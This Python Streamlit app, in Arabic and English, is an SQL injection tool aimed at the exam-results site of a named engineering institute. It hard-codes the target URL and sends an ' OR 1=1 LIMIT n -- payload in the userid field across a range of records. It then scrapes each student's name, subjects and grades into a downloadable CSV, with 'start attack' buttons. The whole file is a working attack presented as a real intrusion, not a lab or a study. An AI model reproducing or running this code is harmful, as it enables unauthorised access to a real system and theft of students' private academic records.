#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SQL Injection Scanner - Real Attack Only
استخراج بيانات الطلاب - هجوم حقيقي فقط
Ahmed Tabana
نسخة Streamlit - جاهزة للنشر على Streamlit Cloud
"""

import streamlit as st
import requests
from bs4 import BeautifulSoup
import time
import pandas as pd
from datetime import datetime

# ------------------------------------------------------------
# إعداد الصفحة
# ------------------------------------------------------------
st.set_page_config(
    page_title="SQL Scanner | Ahmed Tabana",
    page_icon="🎓",
    layout="wide",
    initial_sidebar_state="collapsed"
)

# ------------------------------------------------------------
# CSS مخصص
# ------------------------------------------------------------
st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
    
    * {
        font-family: 'Cairo', sans-serif;
    }
    
    .stApp {
        background-color: #0a0c0e;
        direction: rtl;
    }
    
    .main-title {
        color: #00ff80;
        font-size: 24px;
        font-weight: bold;
        padding: 20px;
        border-bottom: 2px solid #00ff80;
        margin-bottom: 20px;
        text-align: center;
    }
    
    .log-box {
        background-color: #0f1215;
        border: 1px solid #00ff80;
        border-radius: 8px;
        padding: 15px;
        height: 200px;
        overflow-y: auto;
        color: #00ff80;
        font-family: monospace;
    }
    
    .log-entry {
        padding: 5px;
        border-bottom: 1px solid rgba(0,255,128,0.1);
    }
    
    .progress-bar {
        background-color: #00ff80 !important;
    }
    
    .stButton > button {
        background-color: transparent;
        color: #00ff80;
        border: 1px solid #00ff80;
        border-radius: 8px;
        padding: 10px 25px;
        font-weight: bold;
        width: 100%;
    }
    
    .stButton > button:hover {
        background-color: #00ff80;
        color: #0a0c0e;
    }
    
    .dataframe {
        direction: rtl;
        text-align: center;
    }
    
    .badge {
        background-color: #00ff80;
        color: #0a0c0e;
        padding: 5px 10px;
        border-radius: 20px;
        font-size: 12px;
    }
</style>
""", unsafe_allow_html=True)

# ------------------------------------------------------------
# العنوان
# ------------------------------------------------------------
st.markdown('<div class="main-title">🎓 اختراق نتيجة طلاب المعهد العالي للهندسه بالمرج</div>', unsafe_allow_html=True)

# ------------------------------------------------------------
# كلاس الاستخراج - نفس الكود بتاعك
# ------------------------------------------------------------
class StudentDataExtractor:
    def __init__(self, target_url):
        self.target_url = target_url
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
    
    def extract_range(self, start=1, end=20):
        for i in range(start, end + 1):
            try:
                payload = {
                    'userid': f"' OR 1=1 LIMIT {i} -- ",
                    'roll': '12345'
                }
                
                response = requests.post(
                    self.target_url,
                    data=payload,
                    headers=self.headers,
                    timeout=15
                )
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    name_section = soup.find_all(
                        'span', 
                        string=lambda text: text and 'اسم الطالب:' in text
                    )
                    
                    student_name = "غير متوفر"
                    if name_section:
                        student_name = name_section[0].next_sibling.strip() if name_section[0].next_sibling else "غير متوفر"
                    
                    table = soup.find('table', {'class': 'container'})
                    subjects = []
                    
                    if table:
                        for row in table.find_all('tr')[1:]:
                            cols = row.find_all('td')
                            if len(cols) >= 2:
                                subject = cols[1].text.strip()
                                grade = cols[0].text.strip()
                                if subject and grade and subject != "المادة":
                                    subjects.append({
                                        'رقم الجلوس': i,
                                        'اسم الطالب': student_name,
                                        'المادة': subject,
                                        'التقدير': grade
                                    })
                    
                    yield {
                        'success': True,
                        'id': i,
                        'name': student_name,
                        'subjects': subjects
                    }
                else:
                    yield {
                        'success': False,
                        'id': i
                    }
                    
            except Exception as e:
                yield {
                    'success': False,
                    'id': i
                }
            
            time.sleep(0.3)

# ------------------------------------------------------------
# Session State
# ------------------------------------------------------------
if 'students_data' not in st.session_state:
    st.session_state.students_data = pd.DataFrame()

if 'logs' not in st.session_state:
    st.session_state.logs = []

if 'is_scanning' not in st.session_state:
    st.session_state.is_scanning = False

# ------------------------------------------------------------
# الواجهة
# ------------------------------------------------------------
col1, col2, col3 = st.columns([1, 2, 1])

with col2:
    # الرابط مخفي لكن موجود
    target_url = "https://www.miesite.com/examresult/"
    
    # إدخال نطاق الطلاب
    range_col1, range_col2 = st.columns(2)
    with range_col1:
        start_id = st.number_input("بدايه من طالب رقم", min_value=1, value=1, step=1)
    with range_col2:
        end_id = st.number_input("الى رقم", min_value=1, value=50, step=1)
    
    # أزرار التحكم
    btn_col1, btn_col2, btn_col3 = st.columns(3)
    with btn_col1:
        start_btn = st.button("🚀 بدء الهجوم", use_container_width=True)
    with btn_col2:
        clear_btn = st.button("🗑️ مسح البيانات", use_container_width=True)
    with btn_col3:
        if not st.session_state.students_data.empty:
            csv = st.session_state.students_data.to_csv(index=False).encode('utf-8-sig')
            st.download_button(
                label="📥 تصدير CSV",
                data=csv,
                file_name=f"students_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
                mime="text/csv",
                use_container_width=True
            )
    
    # شريط التقدم
    progress_bar = st.progress(0, text="جاهز")
    status_text = st.empty()
    
    # سجل العمليات
    st.markdown("### 📋 سجل العمليات")
    log_container = st.empty()
    
    # عرض السجل
    def update_logs():
        log_html = '<div class="log-box">'
        for log in st.session_state.logs[-15:]:  # آخر 15 سجل
            log_html += f'<div class="log-entry">{log}</div>'
        log_html += '</div>'
        log_container.markdown(log_html, unsafe_allow_html=True)
    
    update_logs()
    
    # جدول البيانات
    st.markdown("### 📊 بيانات الطلاب")
    search_term = st.text_input("🔍 بحث في الاسم أو المادة أو التقدير", placeholder="اكتب كلمة للبحث...")
    
    if not st.session_state.students_data.empty:
        df = st.session_state.students_data
        if search_term:
            mask = df.apply(lambda row: search_term.lower() in str(row).lower(), axis=1)
            df = df[mask]
        st.dataframe(df, use_container_width=True, height=400)
        st.markdown(f'<span class="badge">إجمالي السجلات: {len(st.session_state.students_data)}</span>', unsafe_allow_html=True)
    else:
        st.info("لا توجد بيانات حالياً. ابدأ الهجوم لجلب البيانات.")

# ------------------------------------------------------------
# منطق الهجوم
# ------------------------------------------------------------
def add_log(message):
    timestamp = datetime.now().strftime("%H:%M:%S")
    st.session_state.logs.append(f"[{timestamp}] {message}")
    update_logs()

def clear_data():
    st.session_state.students_data = pd.DataFrame()
    st.session_state.logs = []
    add_log("🗑️ تم مسح جميع البيانات")
    st.rerun()

if clear_btn:
    clear_data()

if start_btn and not st.session_state.is_scanning:
    st.session_state.is_scanning = True
    
    # مسح البيانات القديمة لو المستخدم عايز
    if not st.session_state.students_data.empty:
        if not st.button("هل تريد المسح؟"):
            pass
    
    add_log(f"🚀 بدء الهجوم على {target_url}")
    add_log(f"🎯 استخراج الطلاب من {start_id} إلى {end_id}")
    
    extractor = StudentDataExtractor(target_url)
    all_data = []
    
    for i, result in enumerate(extractor.extract_range(int(start_id), int(end_id))):
        progress = int(((result['id'] - start_id + 1) / (end_id - start_id + 1)) * 100)
        progress_bar.progress(progress / 100, text=f"التقدم: {progress}%")
        
        if result['success']:
            add_log(f"✅ تم استخراج بيانات الطالب {result['name']} - الرقم {result['id']}")
            if result['subjects']:
                for subject_data in result['subjects']:
                    all_data.append(subject_data)
                
                # تحديث DataFrame
                if all_data:
                    st.session_state.students_data = pd.DataFrame(all_data)
                    status_text.markdown(f"📊 عدد الطلاب: {st.session_state.students_data['رقم الجلوس'].nunique()} | عدد المواد: {len(st.session_state.students_data)}")
        else:
            add_log(f"❌ فشل استخراج الطالب رقم {result['id']}")
    
    add_log("🎯 اكتمل الهجوم بنجاح!")
    status_text.markdown(f"✅ اكتمل - إجمالي المواد: {len(st.session_state.students_data)}")
    st.session_state.is_scanning = False
    st.rerun()

elif start_btn and st.session_state.is_scanning:
    st.warning("هجوم قيد التنفيذ بالفعل... انتظر قليلاً")
